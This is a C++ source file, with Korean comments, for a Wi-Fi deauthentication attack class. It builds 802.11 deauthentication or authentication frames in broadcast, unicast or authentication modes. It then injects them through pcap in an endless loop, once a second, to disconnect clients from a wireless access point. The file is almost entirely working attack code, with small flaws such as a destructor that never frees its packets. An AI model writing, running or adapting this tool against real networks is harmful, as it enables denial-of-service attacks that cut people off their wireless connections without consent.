#include "CDeauthAttack.h"


CDeauthenticationAttack::CDeauthenticationAttack(int option)
{    
    int radioHeaderSize = this->radioHeader.getDeauthenticationPacketSize();

    if(option == 0) // Braodcast
    {
        int deauthSize = this->deauthentiocation.getDeauthenticationPacketSize();
        this->packetSize = radioHeaderSize + deauthSize;
        
        char* packet = new char[this->packetSize];
        this->radioHeader.getDeauthenticationPacket(&packet[0]);
        this->packetlist.push_back(packet);
    }
    else if(option == 1)    // Unicast
    {
        int deauthSize = this->deauthentiocation.getDeauthenticationPacketSize();
        this->packetSize = radioHeaderSize + deauthSize;

        // AP Packet
        char* apPacket = new char[this->packetSize];
        this->radioHeader.getDeauthenticationPacket(&apPacket[0]);
        this->packetlist.push_back(apPacket);

        // Station Packet
        char* stationPacket = new char[this->packetSize];
        this->radioHeader.getDeauthenticationPacket(&stationPacket[0]);
        this->packetlist.push_back(stationPacket);
    }
    else    // Authentication
    {
        int deauthSize = this->deauthentiocation.getAuthenticationPacketSize();
        this->packetSize = radioHeaderSize + deauthSize;

        char* packet = new char[this->packetSize];
        this->radioHeader.getDeauthenticationPacket(&packet[0]);
        this->packetlist.push_back(packet);
    }

}

CDeauthenticationAttack::~CDeauthenticationAttack()
{
    // 동적할당된 packet free

}

bool CDeauthenticationAttack::generatePacket(char* strApMac, char* strStationMac, int option)
{
    int radioHeaderSize = this->radioHeader.getDeauthenticationPacketSize();

    if(option == 0) // Braodcast
    {
        C80211Deauthentication broadcastDeauth(strApMac);

        // Deauthentication
        broadcastDeauth.getDeauthenticationPacket(&packetlist[0][radioHeaderSize]);
    }
    else if(option == 1)    // Unicast
    {
        // Station Packet
        C80211Deauthentication stationDeauth(strApMac, strStationMac);
        // Deauthentication
        stationDeauth.getDeauthenticationPacket(&packetlist[0][radioHeaderSize]);

        // Ap Packet
        C80211Deauthentication apDeauth(strStationMac, strApMac);
        // Deauthentication
        apDeauth.getDeauthenticationPacket(&packetlist[1][radioHeaderSize]);
    }
    else    // Authentication
    {
        C80211Deauthentication authentication(strStationMac, strApMac);
        //  기기 ap 기기

        // Authentication
        authentication.getAuthenticationPacket(&packetlist[0][radioHeaderSize]);
    }
    return true;
}

void CDeauthenticationAttack::sendPacket(pcap_t* handle, char* strApMac, char* strStationMac, int option)
{
    while(true)
    {
        this->generatePacket(strApMac, strStationMac, option);

        for(int i = 0; i < this->packetlist.size(); i++)
        {
            // 매번 패킷의 뒷내용을 재생성
            BYTE* packet = (BYTE*)this->packetlist[i];
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), this->packetSize);
            // std::cout << i << "번째 패킷 발송"<< std::endl;
        }
        sleep(1);
    }
}